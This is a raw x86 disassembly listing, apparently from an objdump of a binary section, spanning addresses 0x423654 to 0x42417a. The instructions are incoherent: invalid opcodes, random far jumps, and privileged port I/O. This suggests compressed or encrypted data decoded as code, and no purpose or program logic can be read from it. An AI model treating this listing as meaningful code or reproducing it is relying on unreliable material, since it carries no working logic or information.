  423654:	scas   eax,DWORD PTR es:[edi]
  423655:	es jmp 0x423603
  423658:	repnz or al,0x17
  42365b:	ret    0x95dd
  42365e:	lds    edi,FWORD PTR [edi+0x5d9c6e]
  423664:	pop    ss
  423665:	xor    eax,0x94981283
  42366a:	je     0x423665
  42366c:	aaa    
  42366d:	mov    esi,0x0
	...
  4236d6:	or     BYTE PTR [edi-0x8808b84],0x88
  4236dd:	jmp    FWORD PTR [esi-0x6f]
  4236e0:	jl     0x4236f5
  4236e2:	xor    esp,DWORD PTR [ebx]
  4236e4:	fsub   st(5),st
  4236e6:	addr16 jl 0x4236ea
  4236e9:	add    BYTE PTR [eax],al
  4236eb:	add    DWORD PTR [eax],eax
  4236ed:	add    BYTE PTR [eax],bh
  4236ef:	or     BYTE PTR [ecx-0x76f2cea0],0xa2
  4236f6:	gs pusha 
  4236f8:	div    ebp
  4236fa:	xor    al,0x7
  4236fc:	or     ah,bh
  4236fe:	ret    0xefc4
  423701:	mov    ecx,0xb06aca0d
  423706:	jmp    0x5d4cfd70
  42370b:	arpl   WORD PTR [esi+0x36],bp
  42370e:	xor    eax,0x2f96eed9
  423713:	test   eax,0x80348790
  423718:	out    dx,al
  423719:	or     DWORD PTR [eax+ebp*2-0x1e],0x9
  42371e:	mov    dl,0xff
  423720:	sbb    eax,0x4933b298
  423725:	mov    al,ds:0x8c1b20bc
  42372a:	and    al,0x3a
  42372c:	into   
  42372d:	push   es
  42372e:	inc    ecx
  42372f:	mov    ebp,0x86e1ea0f
  423734:	jbe    0x4237ab
  423736:	pop    ebx
  423737:	gs js  0x42377f
  42373a:	out    0x3e,al
  42373c:	mov    ds:0x90d0d6d4,eax
  423741:	and    bh,dh
  423743:	xchg   ebx,eax
  423744:	mov    ch,0xe7
  423746:	push   ecx
  423747:	mov    dl,0xfc
  423749:	push   ecx
  42374a:	xchg   ebp,eax
  42374b:	add    edx,DWORD PTR [ebx]
  42374d:	sbb    BYTE PTR [ecx+0x30],0xb9
  423751:	cmp    bl,BYTE PTR [ecx-0xa]
  423754:	popa   
  423755:	in     al,dx
  423756:	pop    eax
  423757:	sub    bl,BYTE PTR [esp+esi*1+0x7f]
  42375b:	mul    BYTE PTR [ebp-0x28876e6e]
  423761:	push   cs
  423762:	pop    edi
  423763:	push   edi
  423764:	lea    ecx,[ebx+eiz*4+0x61]
  423768:	in     eax,0xac
  42376a:	mov    ebx,DWORD PTR [ecx-0x23]
  42376d:	imul   esi,DWORD PTR [eax],0x56188e99
  423773:	mov    esi,DWORD PTR [esi+0x50]
  423776:	out    dx,eax
  423777:	std    
  423778:	hlt    
  423779:	xchg   ebx,eax
  42377a:	das    
  42377b:	add    al,0xa6
  42377d:	pop    eax
  42377e:	fst    st(7)
  423780:	xor    edx,DWORD PTR [eax+0x87e26f7]
  423786:	jne    0x423713
  423788:	ret    0x40ba
  42378b:	clc    
  42378c:	ficom  WORD PTR [esi]
  42378e:	jl     0x423752
  423790:	cs fcmovbe st,st(0)
  423793:	enter  0x5dbf,0xd4
  423797:	loop   0x423784
  423799:	xor    eax,0xc55e8067
  42379e:	and    eax,0xaa25a607
  4237a3:	mov    bh,0x89
  4237a5:	xchg   ebp,eax
  4237a6:	clc    
  4237a7:	aad    0x79
  4237a9:	inc    edi
  4237aa:	sar    DWORD PTR [eax+0x463e4aee],1
  4237b0:	mov    ah,0x1
  4237b2:	cs ds clc 
  4237b5:	scas   al,BYTE PTR es:[edi]
  4237b6:	mov    bh,0xd7
  4237b8:	rcl    DWORD PTR [eax+esi*4-0x4af93d1f],1
  4237bf:	jmp    0x4237dd
  4237c1:	and    DWORD PTR [edx-0x2],eax
  4237c4:	hlt    
  4237c5:	loope  0x423764
  4237c7:	stc    
  4237c8:	das    
  4237c9:	(bad)  
  4237ca:	sbb    cl,dl
  4237cc:	jno    0x4237c7
  4237ce:	pop    esi
  4237cf:	fld    QWORD PTR [esi+0x624c3c44]
  4237d5:	add    DWORD PTR [edx-0xbb5007],0xc13f5629
  4237df:	jle    0x423784
  4237e1:	xchg   dh,dh
  4237e3:	test   eax,0xbf67518b
  4237e8:	iret   
  4237e9:	pop    ecx
  4237ea:	aaa    
  4237eb:	jl     0x423868
  4237ed:	imul   eax,DWORD PTR [eax],0x0
	...
  423854:	add    BYTE PTR [eax],al
  423856:	xor    al,0x23
  423858:	jo     0x4237f7
  42385a:	ja     0x42383b
  42385c:	std    
  42385d:	stos   DWORD PTR es:[edi],eax
  42385e:	(bad)  
  42385f:	sbb    edx,esi
  423861:	jmp    0x7d67:0x6896da7d
  423868:	add    DWORD PTR [eax],eax
  42386a:	add    BYTE PTR [ecx],al
  42386c:	add    BYTE PTR [eax],al
  42386e:	repz rcl bl,1
  423871:	push   cs
  423872:	or     eax,0x639d42da
  423877:	imul   ebx,DWORD PTR [edx],0xfffffffe
  42387a:	(bad)  
  42387b:	out    0xa7,al
  42387d:	mov    ebx,0x293fb498
  423882:	test   esi,esi
  423884:	lds    esp,FWORD PTR [esi-0x7]
  423887:	ficomp DWORD PTR [ecx+0x71]
  42388a:	mov    eax,0x76442a80
  42388f:	push   ebx
  423890:	or     ebp,DWORD PTR [esp+ebp*2+0x6739b8a5]
  423897:	jle    0x4238d2
  423899:	frstor [esi-0x3f]
  42389c:	loopne 0x4238e2
  42389e:	hlt    
  42389f:	adc    eax,0xafb17582
  4238a4:	pop    eax
  4238a5:	push   ds
  4238a6:	nop
  4238a7:	inc    edx
  4238a8:	out    0x47,al
  4238aa:	out    0x47,al
  4238ac:	pop    ebx
  4238ad:	loop   0x4238f1
  4238af:	imul   esp,DWORD PTR [esi],0x5
  4238b2:	push   eax
  4238b3:	frstor [eax+ecx*1]
  4238b6:	xor    edi,DWORD PTR ds:0xfce8913a
  4238bc:	lds    esi,FWORD PTR [esi-0xaa29e95]
  4238c2:	jecxz  0x423906
  4238c4:	cdq    
  4238c5:	test   eax,0x70a4905f
  4238ca:	xor    DWORD PTR [ebx],0x43717668
  4238d0:	push   es
  4238d1:	stos   DWORD PTR es:[edi],eax
  4238d2:	cdq    
  4238d3:	jecxz  0x42386e
  4238d5:	push   ebp
  4238d6:	and    al,0x90
  4238d8:	or     DWORD PTR [ebx],ecx
  4238da:	stos   BYTE PTR es:[edi],al
  4238db:	pop    edi
  4238dc:	dec    ecx
  4238dd:	mov    dh,dl
  4238df:	shl    DWORD PTR [esi-0x46],cl
  4238e2:	out    dx,eax
  4238e3:	fist   WORD PTR [ecx+0x478130b8]
  4238e9:	ss push ebp
  4238eb:	mov    esi,0x94c48eb4
  4238f0:	inc    esp
  4238f1:	or     eax,0x374b17c8
  4238f6:	jmp    FWORD PTR [ebp-0x784b4843]
  4238fc:	ja     0x423918
  4238fe:	scas   al,BYTE PTR es:[edi]
  4238ff:	or     BYTE PTR [esi+0x33],0x9
  423903:	xor    al,0x48
  423905:	scas   eax,DWORD PTR es:[edi]
  423906:	pop    ebx
  423907:	inc    edi
  423908:	dec    ecx
  423909:	or     al,0x89
  42390b:	dec    esi
  42390c:	das    
  42390d:	sbb    ebx,esi
  42390f:	retf   
  423910:	add    DWORD PTR [esi-0x7a8c30fa],edi
  423916:	cwde   
  423917:	sbb    al,ah
  423919:	(bad)  
  42391a:	push   ecx
  42391b:	dec    edi
  42391c:	jne    0x42392e
  42391e:	sbb    BYTE PTR [edx-0x6c],0x8c
  423922:	leave  
  423923:	iret   
  423924:	jno    0x4238cf
  423926:	add    BYTE PTR [ebx+0x4c02d2b3],bl
  42392c:	mov    al,ds:0x972f9335
  423931:	adc    al,0x88
  423933:	mov    ds:0xd89c0f90,eax
  423938:	cwde   
  423939:	icebp  
  42393a:	call   0x1cff:0xab28c158
  423941:	xor    edx,DWORD PTR [eax]
  423943:	pusha  
  423944:	add    eax,0x421f1cec
  423949:	or     edi,edi
  42394b:	cs adc eax,0xddad21ad
  423951:	out    0xe9,al
  423953:	shl    DWORD PTR [esp+eiz*2-0x58],0x11
  423958:	popa   
  423959:	jle    0x4239c7
  42395b:	pop    edi
  42395c:	sti    
  42395d:	inc    esp
  42395e:	mov    ah,0x78
  423960:	mov    ds:0x16996147,al
  423965:	push   0xd8f8ecc8
  42396a:	daa    
  42396b:	push   ebp
  42396c:	lds    ecx,FWORD PTR [edx+0x0]
	...
  4239d3:	add    BYTE PTR [eax],al
  4239d5:	add    BYTE PTR [edx-0x770e5c],cl
  4239db:	(bad)  
  4239dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239de:	push   ecx
  4239df:	sbb    eax,0xd6692bbd
  4239e4:	daa    
  4239e5:	loop   0x423a4e
  4239e7:	jle    0x4239ea
  4239e9:	add    BYTE PTR [eax],al
  4239eb:	add    DWORD PTR [eax],eax
  4239ed:	add    BYTE PTR [ecx+0x3d],dh
  4239f0:	mov    WORD PTR [ecx],?
  4239f2:	ins    BYTE PTR es:[edi],dx
  4239f3:	addr16 in eax,0x7f
  4239f6:	retf   0xc4ba
  4239f9:	mov    WORD PTR [edx+0x51],cs
  4239fc:	fimul  DWORD PTR ds:0x8b262a3f
  423a02:	xchg   ebx,eax
  423a03:	lock or BYTE PTR gs:0x2eb5ebe8,0x9a
  423a0c:	int    0x84
  423a0e:	ins    BYTE PTR es:[edi],dx
  423a0f:	fidivr WORD PTR [eax+0x32]
  423a12:	(bad)  
  423a13:	jo     0x4239f5
  423a15:	jmp    0x4e3:0xf4f80b89
  423a1c:	not    BYTE PTR [esi]
  423a1e:	inc    edi
  423a1f:	mov    bh,0x2b
  423a21:	or     edi,edx
  423a23:	add    esi,0xffffffdf
  423a26:	enter  0x8bfe,0xb9
  423a2a:	xor    BYTE PTR [ebp+0x59],ch
  423a2d:	push   0xea1102d6
  423a32:	arpl   WORD PTR [ebp-0x76],cx
  423a35:	jge    0x4239d3
  423a37:	add    ch,BYTE PTR [eax-0x6d914b7e]
  423a3d:	shr    BYTE PTR [edx+ecx*2+0x19],1
  423a41:	pushf  
  423a42:	cmp    BYTE PTR [ebx+0x890b5b5],dh
  423a48:	out    dx,eax
  423a49:	les    ebx,FWORD PTR [edi+edi*1-0x6d0f0150]
  423a50:	inc    edi
  423a51:	add    eax,0xa247b2b4
  423a56:	inc    eax
  423a57:	jmp    0x9b43b801
  423a5c:	jge    0x423a0b
  423a5e:	dec    eax
  423a5f:	scas   eax,DWORD PTR es:[edi]
  423a60:	sbb    bh,BYTE PTR [edi-0x692bc445]
  423a66:	addr16 push ecx
  423a68:	xchg   edi,eax
  423a69:	mov    esp,DWORD PTR [eax-0xb]
  423a6c:	inc    edi
  423a6d:	rcl    esp,0xbf
  423a70:	sub    BYTE PTR [edx-0x73],0x3b
  423a74:	ficomp WORD PTR [esi+ebp*2-0x2513d598]
  423a7b:	mov    ds:0xf0fd81de,eax
  423a80:	dec    esi
  423a81:	mov    WORD PTR [ebx+0x30],ss
  423a84:	mov    esp,0x86b5d64b
  423a89:	and    BYTE PTR [edx+ebp*8],al
  423a8c:	add    al,0xa7
  423a8e:	and    DWORD PTR [ebp+0x9],0x50
  423a92:	pop    ebx
  423a93:	jo     0x423a8e
  423a95:	mov    DWORD PTR [eax-0x3b64ff5d],ebx
  423a9b:	je     0x423ae7
  423a9d:	shr    DWORD PTR [edx+edx*1],cl
  423aa0:	fdivr  st(5),st
  423aa2:	out    dx,al
  423aa3:	test   ch,0x43
  423aa6:	push   ds
  423aa7:	or     BYTE PTR [ebx+0x1e6f3e6c],dl
  423aad:	mov    ch,0xec
  423aaf:	ss push 0x312dc79d
  423ab5:	in     eax,0xa1
  423ab7:	std    
  423ab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ab9:	or     ebx,eax
  423abb:	leave  
  423abc:	aaa    
  423abd:	dec    edi
  423abe:	fstp   TBYTE PTR [edx+0xb309946]
  423ac4:	aad    0x51
  423ac6:	inc    eax
  423ac7:	test   eax,0xa2e8925c
  423acc:	add    DWORD PTR ds:0x85e946d7,esi
  423ad2:	in     eax,dx
  423ad3:	in     al,dx
  423ad4:	cs aas 
  423ad6:	sbb    DWORD PTR [edx],ebp
  423ad8:	je     0x423b4b
  423ada:	lahf   
  423adb:	pusha  
  423adc:	jmp    0x423b47
  423ade:	das    
  423adf:	popf   
  423ae0:	in     al,dx
  423ae1:	scas   al,BYTE PTR es:[edi]
  423ae2:	into   
  423ae3:	pop    ecx
  423ae4:	mov    cl,0x76
  423ae6:	pop    esi
  423ae7:	cs push ebp
  423ae9:	cli    
  423aea:	es xchg ebp,eax
  423aec:	cs sbb eax,0x0
	...
  423b56:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423b5c:	cli    
  423b5d:	mov    edi,0x60851ed8
  423b62:	and    BYTE PTR [esi+0x53],cl
  423b65:	mov    fs,WORD PTR [edi+0x7f]
  423b68:	add    DWORD PTR [eax],eax
  423b6a:	add    BYTE PTR [ecx],al
  423b6c:	add    BYTE PTR [eax],al
  423b6e:	in     eax,dx
  423b6f:	sub    esi,edx
  423b71:	nop
  423b72:	aam    0xf2
  423b74:	xor    eax,DWORD PTR fs:[ebp-0x2f90a2fe]
  423b7b:	or     esi,ebx
  423b7d:	jmp    DWORD PTR [ecx-0x1e]
  423b80:	aad    0xf8
  423b82:	add    eax,0xd7d44db8
  423b87:	ficom  DWORD PTR [edi+0x14]
  423b8a:	sub    DWORD PTR [ebx],edi
  423b8c:	arpl   WORD PTR [esi],bx
  423b8e:	fscale 
  423b90:	pusha  
  423b91:	xchg   esi,eax
  423b92:	sbb    DWORD PTR [ebx-0x44],ebp
  423b95:	and    dl,BYTE PTR [esi+0x3d]
  423b98:	mov    eax,0x64a4d042
  423b9d:	pop    edx
  423b9e:	bound  edx,QWORD PTR [edx+0xd]
  423ba1:	pop    eax
  423ba2:	adc    edx,esi
  423ba4:	xchg   esp,eax
  423ba5:	je     0x423b76
  423ba7:	stos   DWORD PTR es:[edi],eax
  423ba8:	(bad)  
  423ba9:	enter  0x2e20,0x16
  423bad:	les    ecx,FWORD PTR [edi+0x7c]
  423bb0:	leave  
  423bb1:	jg     0x423b66
  423bb3:	aad    0x1d
  423bb5:	inc    eax
  423bb6:	scas   al,BYTE PTR es:[edi]
  423bb7:	clc    
  423bb8:	test   eax,0x36b0475e
  423bbd:	push   eax
  423bbe:	fidivr DWORD PTR [edx+esi*2+0x49]
  423bc2:	adc    ch,ch
  423bc4:	push   ss
  423bc5:	shl    DWORD PTR [esi+0x107f193b],0x26
  423bcc:	sub    BYTE PTR [esi],dl
  423bce:	push   ebx
  423bcf:	es addr16 jmp 0x6938:0x79f0332d
  423bd8:	ret    0x2125
  423bdb:	retf   
  423bdc:	push   ds
  423bdd:	hlt    
  423bde:	mov    ch,0x73
  423be0:	ror    DWORD PTR [ebp+0x94e8c07],1
  423be6:	repz and dl,ch
  423be9:	div    DWORD PTR [edx]
  423beb:	out    dx,al
  423bec:	clc    
  423bed:	mov    BYTE PTR [edx+0x4c],0x16
  423bf1:	not    DWORD PTR [eax+0x23]
  423bf4:	jb     0x423c00
  423bf6:	scas   al,BYTE PTR es:[edi]
  423bf7:	outs   dx,BYTE PTR ds:[esi]
  423bf8:	and    eax,0xc3bdd064
  423bfd:	jmp    0x6bd70a7
  423c02:	mov    esi,0x4c4ade24
  423c07:	push   esi
  423c08:	xor    BYTE PTR ds:0x1196c88e,ah
  423c0e:	call   0x1943:0xc3f250f9
  423c15:	rcl    BYTE PTR [ebp-0x4003f9d1],cl
  423c1b:	pop    eax
  423c1c:	(bad)  
  423c1d:	cwde   
  423c1e:	pop    edi
  423c1f:	mov    bh,0xdf
  423c21:	sbb    DWORD PTR [edi-0x46],eax
  423c24:	or     BYTE PTR [ebx-0x21],cl
  423c27:	or     dl,cl
  423c29:	dec    DWORD PTR [ecx+0x34]
  423c2c:	repz mov ds:0x9c77eddc,eax
  423c32:	shl    BYTE PTR [eax],0x2f
  423c35:	jbe    0x423c6b
  423c37:	imul   esi,DWORD PTR [ebx],0xe0540fc4
  423c3d:	retf   0x30ab
  423c40:	imul   edx,DWORD PTR [ebx],0xe39be7a2
  423c46:	pop    esp
  423c47:	cmp    DWORD PTR [ebx],ecx
  423c49:	dec    esp
  423c4a:	(bad)  
  423c4b:	lock fbld TBYTE PTR [ebx]
  423c4e:	rol    BYTE PTR [ecx+0x3b25746c],0xc2
  423c55:	call   0xa14f5b58
  423c5a:	push   cs
  423c5b:	shl    dl,1
  423c5d:	dec    edx
  423c5e:	(bad)  
  423c5f:	pop    ss
  423c60:	test   BYTE PTR [eax+0x4a7a74e8],cl
  423c66:	in     eax,0x56
  423c68:	les    esp,FWORD PTR ds:0xc3c9c005
	...
  423cd6:	std    
  423cd7:	(bad)  
  423cd8:	test   eax,0xff57ab46
  423cdd:	call   FWORD PTR [eax-0x17bb99e9]
  423ce3:	daa    
  423ce4:	xor    ebx,esp
  423ce6:	add    BYTE PTR [bx+di],0x0
  423cea:	add    BYTE PTR [ecx],al
  423cec:	add    BYTE PTR [eax],al
  423cee:	sbb    esi,edi
  423cf0:	sub    dh,dh
  423cf2:	(bad)  
  423cf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cf5:	test   eax,0xf8dbb8c8
  423cfa:	(bad)
  423cfd:	jb     0x423cc6
  423cff:	and    BYTE PTR [edx],cl
  423d01:	push   ebx
  423d02:	xchg   edi,eax
  423d03:	jge    0x423ca4
  423d05:	pop    esp
  423d06:	add    DWORD PTR [ecx+0x6652a619],ebx
  423d0c:	cmp    bh,dh
  423d0e:	xor    esi,DWORD PTR [esp+edi*2]
  423d11:	dec    edx
  423d12:	mov    ds:0x480b0bac,al
  423d17:	mov    al,0xb3
  423d19:	jp     0x423cd9
  423d1b:	loop   0x423cad
  423d1d:	int3   
  423d1e:	cld    
  423d1f:	sbb    al,0x8e
  423d21:	cmp    DWORD PTR [edx],esi
  423d23:	mov    WORD PTR [esi-0x3d],ss
  423d26:	cmp    edx,DWORD PTR [ecx+ebx*1-0x1a]
  423d2a:	xchg   ebx,eax
  423d2b:	loop   0x423cc0
  423d2d:	out    0x9a,al
  423d2f:	mov    ah,0x79
  423d31:	nop
  423d32:	fdivr  DWORD PTR [esi-0x5d]
  423d35:	aas    
  423d36:	call   0x58e:0x26e8569a
  423d3d:	call   0xcea6:0x46e8f0fb
  423d44:	shr    BYTE PTR [eax-0x15c40c6d],0x2c
  423d4b:	mov    BYTE PTR [eax+ebx*4+0x4de3a4f],bh
  423d52:	neg    DWORD PTR ds:0xc82bb3f1
  423d58:	inc    esp
  423d59:	mov    eax,ds:0x233d922f
  423d5e:	xchg   ebx,eax
  423d5f:	inc    ebx
  423d60:	test   BYTE PTR [eax+0x3c],cl
  423d63:	sub    DWORD PTR [eax],edx
  423d65:	gs aas 
  423d67:	lods   al,BYTE PTR ds:[esi]
  423d68:	push   edx
  423d69:	push   edx
  423d6a:	mov    ds,ebp
  423d6c:	xor    ah,BYTE PTR [ebx+0x3c116402]
  423d72:	pop    esi
  423d73:	cmp    BYTE PTR [edx+0x3a3b02b3],dl
  423d79:	or     ebp,edx
  423d7b:	xchg   ebp,eax
  423d7c:	jbe    0x423d53
  423d7e:	imul   edi,DWORD PTR [edi-0x14c2e782],0xffffffaf
  423d85:	inc    ebp
  423d86:	mov    edx,0x94580691
  423d8b:	mov    eax,0xba59f1b6
  423d90:	mov    eax,ds:0xc8ae0cd1
  423d95:	push   0xdfb18b7b
  423d9a:	push   DWORD PTR [eax]
  423d9c:	push   ebp
  423d9d:	ds ja  0x423dbf
  423da0:	call   0xbe7e99bb
  423da5:	mov    DWORD PTR [ecx+0x8],ebp
  423da8:	loope  0x423d93
  423daa:	aaa    
  423dab:	push   es
  423dac:	or     cl,BYTE PTR [eax+eax*2]
  423daf:	pop    edx
  423db0:	push   cs
  423db1:	test   al,0x5f
  423db3:	aam    0xd1
  423db5:	xor    BYTE PTR [ebx+0x41a72d3d],0x6a
  423dbc:	loope  0x423de4
  423dbe:	rol    BYTE PTR [ebp+0x1ed67dea],1
  423dc4:	retf   0x7687
  423dc7:	and    bh,dl
  423dc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dca:	aas    
  423dcb:	enter  0x8272,0x7f
  423dcf:	xchg   BYTE PTR ds:0xbef58da2,ah
  423dd5:	pop    ebx
  423dd6:	push   ds
  423dd7:	test   eax,0x4c29212f
  423ddc:	cmp    al,0x32
  423dde:	inc    ebx
  423ddf:	lds    eax,FWORD PTR [esi+0x78ae6094]
  423de5:	push   0x7d
  423de7:	(bad)
  423dec:	mov    ebx,0xf7
	...
  423e55:	add    BYTE PTR [edx-0xa],ah
  423e58:	xchg   DWORD PTR [ecx],ecx
  423e5a:	xchg   edi,eax
  423e5b:	jns    0x423e4b
  423e5d:	jmp    DWORD PTR [edi]
  423e5f:	mov    DWORD PTR [eax+0x45a02cd2],esp
  423e65:	in     eax,dx
  423e66:	add    DWORD PTR [bx+di],0x10000
  423e6d:	add    BYTE PTR [eax],ah
  423e6f:	mov    esp,0xf9332565
  423e74:	and    al,0xd0
  423e76:	je     0x423eac
  423e78:	sahf   
  423e79:	jno    0x423e65
  423e7b:	in     eax,dx
  423e7c:	outs   dx,BYTE PTR ds:[esi]
  423e7d:	(bad)  
  423e7e:	pop    ds
  423e7f:	or     ch,BYTE PTR [esi-0x16]
  423e82:	and    eax,0x2735a8e2
  423e87:	ret    0xe5cd
  423e8a:	jecxz  0x423e0e
  423e8c:	dec    edi
  423e8d:	sti    
  423e8e:	inc    eax
  423e8f:	pushf  
  423e90:	pop    ecx
  423e91:	fucom  st(5)
  423e94:	adc    eax,0xb2605c78
  423e99:	shl    BYTE PTR [esi],1
  423e9b:	in     eax,dx
  423e9c:	xor    eax,0x4651109c
  423ea1:	mov    ebp,0x28e54f7b
  423ea6:	and    al,0x20
  423ea8:	ins    BYTE PTR es:[edi],dx
  423ea9:	pop    esp
  423eaa:	(bad)  
  423eab:	aas    
  423eac:	outs   dx,BYTE PTR ds:[esi]
  423ead:	sbb    bl,ch
  423eaf:	repz mov ch,0x97
  423eb2:	push   fs
  423eb4:	push   esi
  423eb5:	daa    
  423eb6:	adc    eax,ecx
  423eb8:	mov    ds:0xa71fc021,al
  423ebd:	imul   BYTE PTR [ecx-0x1f3ae69]
  423ec3:	cwde   
  423ec4:	mov    edx,0x8ec36f23
  423ec9:	fwait
  423eca:	sbb    bh,bh
  423ecc:	mov    dl,0x4c
  423ece:	mov    esi,0x27fdf326
  423ed3:	mov    bl,0x2d
  423ed5:	cmp    BYTE PTR [eax+0x5f],dh
  423ed8:	add    BYTE PTR [edx],cl
  423eda:	xor    al,0x5a
  423edc:	inc    BYTE PTR [eax]
  423ede:	jmp    0x423f54
  423ee0:	shl    BYTE PTR gs:[eax-0x745ab84e],cl
  423ee7:	mov    BYTE PTR [ebx-0x37],cl
  423eea:	add    al,0x19
  423eec:	dec    edx
  423eed:	into   
  423eee:	shr    DWORD PTR [edi+ebx*8],1
  423ef1:	nop
  423ef2:	dec    esi
  423ef3:	sbb    eax,0xcf85540b
  423ef8:	cmp    edi,DWORD PTR ss:[eax]
  423efb:	int    0xaa
  423efd:	addr16 pop esi
  423eff:	add    DWORD PTR [edx-0x900a1c3],eax
  423f05:	xchg   esp,eax
  423f06:	add    al,0x3
  423f08:	ins    DWORD PTR es:[edi],dx
  423f09:	sub    dh,bl
  423f0b:	add    DWORD PTR [esi],ebx
  423f0d:	dec    eax
  423f0e:	sub    ecx,DWORD PTR [edx+ebx*8]
  423f11:	adc    dh,al
  423f13:	pusha  
  423f14:	mov    ds:0xd1019b34,eax
  423f19:	das    
  423f1a:	ret    
  423f1b:	push   edi
  423f1c:	inc    ecx
  423f1d:	pop    ds
  423f1e:	fidivr WORD PTR [edi-0x4eccce1d]
  423f24:	or     bh,bl
  423f26:	cmp    BYTE PTR [ebx-0x4ef579ee],ah
  423f2c:	fsubr  DWORD PTR [edx+0x2db3508e]
  423f32:	xchg   esp,eax
  423f33:	jmp    0xb96f:0x84a3665d
  423f3a:	fdiv   QWORD PTR [esi]
  423f3c:	xor    BYTE PTR [edx-0x2cd8aa39],bl
  423f42:	ja     0x423fa9
  423f44:	xchg   esi,eax
  423f45:	push   es
  423f46:	xchg   ebx,eax
  423f47:	mov    cl,0x8e
  423f49:	gs rcl ebp,0x4c
  423f4d:	icebp  
  423f4e:	cmp    eax,0xd1e35b42
  423f53:	(bad)  
  423f55:	sub    al,0x5e
  423f57:	xor    al,dl
  423f59:	dec    ecx
  423f5a:	aad    0x8c
  423f5c:	clc    
  423f5d:	push   esi
  423f5e:	aam    0x58
  423f60:	or     eax,0x8fc82e74
  423f65:	pop    esp
  423f66:	jge    0x423f3f
  423f68:	loope  0x423eeb
  423f6a:	pop    ss
  423f6b:	punpckldq mm3,DWORD PTR [eax]
	...
  423fd6:	scas   al,BYTE PTR es:[edi]
  423fd7:	call   0x9fff:0xff74b964
  423fde:	adc    al,0x96
  423fe0:	sbb    al,0xd9
  423fe2:	jp     0x423fd9
  423fe4:	sub    BYTE PTR [eax+0x67],dl
  423fe7:	add    BYTE PTR [ecx],0x0
  423fea:	add    BYTE PTR [ecx],al
  423fec:	add    BYTE PTR [eax],al
  423fee:	jmp    0x423fa3
  423ff0:	pop    edi
  423ff1:	out    dx,al
  423ff2:	test   eax,0xc1663a59
  423ff7:	popf   
  423ff8:	add    eax,0x8c5ea466
  423ffd:	aad    0xc3
  423fff:	ins    DWORD PTR es:[edi],dx
  424000:	ins    DWORD PTR es:[edi],dx
  424001:	dec    edi
  424002:	mov    edx,0xd016c42c
  424007:	in     al,dx
  424008:	mov    ecx,0xa46c6bd
  42400d:	mov    esp,0xe0efb381
  424012:	jg     0x423fbc
  424014:	push   ebp
  424015:	dec    eax
  424016:	jmp    eax
  424018:	dec    eax
  424019:	stos   DWORD PTR es:[edi],eax
  42401a:	push   ecx
  42401b:	fmul   DWORD PTR [ebp-0x3b]
  42401e:	or     BYTE PTR ds:0xe9e0b9ec,0x85
  424025:	pop    esp
  424026:	fs mov al,0x5d
  424029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42402a:	fs jmp 0x424025
  42402d:	mov    ebp,0x43afdf9
  424032:	inc    ebx
  424033:	push   es
  424034:	sub    DWORD PTR [ebx],eax
  424036:	out    0x8b,eax
  424038:	mov    eax,ds:0x225f05ee
  42403d:	mov    ah,bl
  42403f:	or     ecx,edi
  424041:	xchg   esp,eax
  424042:	test   eax,0x8eb6f7db
  424047:	idiv   BYTE PTR [ebp+eiz*1+0x5d388e95]
  42404e:	mov    esi,0x8196581b
  424053:	cs xchg esi,eax
  424055:	int    0x33
  424057:	xor    dl,bh
  424059:	or     BYTE PTR [esi-0x6a],bl
  42405c:	jnp    0x424059
  42405e:	pop    ds
  42405f:	test   eax,0xd3522a01
  424064:	stos   BYTE PTR es:[edi],al
  424065:	(bad)  
  424066:	aam    0xe7
  424068:	pop    esp
  424069:	mov    ebp,0xd5e9b977
  42406f:	arpl   WORD PTR [ebx-0x754dc921],cx
  424075:	stos   BYTE PTR es:[edi],al
  424076:	jb     0x42401b
  424078:	scas   al,BYTE PTR es:[edi]
  424079:	inc    eax
  42407a:	jne    0x424083
  42407c:	inc    edx
  42407d:	dec    ebx
  42407e:	das    
  42407f:	push   ds
  424080:	das    
  424081:	mov    edx,0xdd19f4b9
  424086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424087:	inc    edi
  424088:	push   ss
  424089:	cdq    
  42408a:	adc    DWORD PTR [edi],esp
  42408c:	je     0x424028
  42408e:	loopne 0x4240db
  424090:	push   cs
  424091:	repz jns 0x424055
  424094:	jle    0x42406a
  424096:	leave  
  424097:	lods   eax,DWORD PTR ds:[esi]
  424098:	scas   al,BYTE PTR es:[edi]
  424099:	sbb    DWORD PTR [edx],0x58
  42409c:	adc    al,0x57
  42409e:	push   ebp
  42409f:	or     eax,0xd694b3b9
  4240a4:	xchg   esi,eax
  4240a5:	xchg   esp,eax
  4240a6:	test   DWORD PTR [edx+0x1a41902a],0x8fe54bb9
  4240b0:	loopne 0x424096
  4240b2:	icebp  
  4240b3:	fdiv   QWORD PTR [ecx-0x12e74405]
  4240b9:	inc    ecx
  4240ba:	je     0x42413b
  4240bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240bd:	scas   eax,DWORD PTR es:[edi]
  4240be:	push   edi
  4240bf:	out    dx,eax
  4240c0:	jl     0x424057
  4240c2:	out    0x9b,al
  4240c4:	fst    st(0)
  4240c6:	sbb    ch,dl
  4240c8:	ret    
  4240c9:	inc    edi
  4240ca:	into   
  4240cb:	in     eax,0x79
  4240cd:	arpl   WORD PTR [ebx-0x4701e03c],bx
  4240d3:	sub    eax,0x66080368
  4240d8:	adc    esi,edx
  4240da:	(bad)  
  4240db:	mov    esp,0x8aeb4a0
  4240e0:	xlat   BYTE PTR ds:[ebx]
  4240e1:	into   
  4240e2:	jecxz  0x42413b
  4240e4:	xor    DWORD PTR [ebp+0x5dc71cdb],0xffffffa1
  4240eb:	fdiv   QWORD PTR [edi+0xbe]
	...
  424155:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  424159:	mov    cl,0x2e
  42415b:	idiv   edi
  42415d:	(bad)  
  42415f:	jne    0x424128
  424161:	iret   
  424162:	lahf   
  424163:	je     0x4241a1
  424165:	loope  0x4241ce
  424167:	add    DWORD PTR [ecx],0x0
  42416a:	add    BYTE PTR [ecx],al
  42416c:	add    BYTE PTR [eax],al
  42416e:	mov    bh,BYTE PTR ss:[esp+ebx*1-0xffdaa6c]
  424176:	pop    ss
  424177:	dec    edx
  424178:	in     eax,dx
  424179:	(bad)  
  42417a:	mov    ds:0x4017ae00,al
